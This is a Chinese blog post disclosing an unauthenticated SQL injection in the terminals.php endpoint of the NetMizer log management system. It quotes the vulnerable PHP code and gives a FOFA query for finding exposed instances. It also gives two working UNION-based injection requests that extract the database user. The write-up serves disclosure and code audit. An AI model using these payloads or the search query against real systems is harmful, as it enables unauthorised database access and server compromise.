---
title: "NetMizer日志管理系统 terminals.php SQL注入漏洞"
source: https://mrxn.net/jswz/netmizer-data-echart-terminals-device-sqli.html
asset_dir: assets/netmizer日志管理系统-terminals.php-sql注入漏洞
---

# NetMizer日志管理系统 terminals.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/18 08:27
- 1062浏览
- [0评论](#comment)
- 29分钟阅读

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/echart/terminals.php` 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

# 影响版本

老旧版本

# fofa语法

`body="日志管理系统" && body="NetMizer"`

# 漏洞分析

看下 `/data/echart/terminals.php` 业务实现关键逻辑部分

```
if(isset($devicezone)) {
    $devicename = $devicezone;
    $devicezone = mb_check_encoding($devicezone, 'UTF-8') ? mb_convert_encoding($devicezone, 'gbk', 'UTF-8') : $devicezone;
    if($devicezone == "全部设备") $sqldevice = "";
    else $sqldevice = getsqldevice($devicezone);
} else if(isset($device)){
    if($device != "-1"){
       $devicename = long2ip($device);
       $sqldevice = " and nodeid = $device ";
    } else {
       $sqldevice = "";
    }
} else $sqldevice = "";
......
if($action == 'phonelist-grid'){
       $sqlstr = "select terminal_id,terminal_name,sum(in_bytes) as in_bytes,sum(out_bytes) as out_bytes,sum(in_bytes+out_bytes) as total_bytes,sum(terminal_session_num) as terminal_session_num, max(terminal_num) as terminal_num from tbl_terminals_info where create_time >= $start_time and create_time < $stop_time $sqldevice group by terminal_id order by $flowname desc";
//echo "$sqlstr\n";

       $res=mysql_query($sqlstr);
......
else if($action == 'phonelist-pie'){
       $sqlstr = "select terminal_id,terminal_name,sum($sqlname) as $flowname from tbl_terminals_info where create_time >= $start_time and create_time < $stop_time $sqldevice group by terminal_id order by $flowname desc";
......
else if(1||$action == 'phonelist-bar'){
       if($type < 4)
          $sqlstr = "select terminal_id,terminal_name,sum(in_bytes) as in_bytes,sum(out_bytes) as out_bytes,sum(in_bytes + out_bytes) as total_bytes from tbl_terminals_info where create_time >= $start_time and create_time < $stop_time $sqldevice group by terminal_id order by $flowname desc";
       else
          $sqlstr = "select terminal_id,terminal_name,sum(terminal_session_num) as terminal_session_num from tbl_terminals_info where create_time >= $start_time and create_time < $stop_time $sqldevice group by terminal_id order by $flowname desc";
```

当用户通过 `newdevicezone` GET/POST参数提交以 `ip:` 为前缀的输入时，`ip:` 之后的部分会被提取并赋值给 `$device` 变量。此 `$device` 变量在后续构建 `$sqldevice` 字符串时，未经任何安全处理（如转义或参数化查询）便直接拼接到SQL查询语句 `and nodeid = $device` 中。这使得攻击者能够构造恶意的SQL代码片段，通过 `$newdevicezone` 参数注入到最终执行的SQL查询中，造成[SQL注入](https://mrxn.net/tag/SQL注入)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

## newdevicezone

```
GET /data/echart/terminals.php?action=phonelist-grid&newdevicezone=ip:0%20-111+UNION+ALL+SELECT+null,CONCAT(0x7e,(select/**/user()),0x7e),null,null,null,null,null-- HTTP/1.1
Host: netmizer.mrxn.net
```

## device

```
GET /data/echart/terminals.php?action=phonelist-grid&device=-111+UNION+ALL+SELECT+null,CONCAT(0x7e,(select/**/user()),0x7e),null,null,null,null,null-- HTTP/1.1
Host: netmizer.mrxn.net
```

通过union注入，成功得到数据库用户信息

[![NetMizer日志管理系统 terminals.php SQL注入漏洞](images/img-001-1e7e3802c97e.webp)](https://image.mrxn.net/f8738f83c23a4111b9057f456a563eae.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.newdevicezone](#toc-5-1-)
- [5.2.device](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
